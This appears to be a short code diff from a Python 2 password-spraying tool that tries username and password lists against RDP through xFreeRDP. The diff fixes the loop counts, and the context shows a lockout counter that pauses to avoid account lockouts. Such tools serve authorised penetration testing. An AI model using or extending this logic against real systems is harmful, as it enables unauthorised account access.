@@ -72,14 +72,14 @@ logonsuccess_allowed = "Authentication only, exit status 0"
 status = None
 
 total_accounts = len(usernamesstripped)
-total_accounts = len(passwordsstripped)
+total_passwords = len(passwordsstripped)
 lock_counter = 0
 print "Total number of users: " + str(total_accounts)
 print "Password spraying has now started... please sit tight."
 
 #Now using xFreeRDP to spray accounts
-for i in range(passwordsstripped):
-	for j in range(usernamesstripped):
+for i in range(total_passwords):
+	for j in range(total_accounts):
 		if lock_counter == lockcount:
 			print "Pausing for ' + str(locktime) + ' minutes...\n"
 			lock_counter = 0
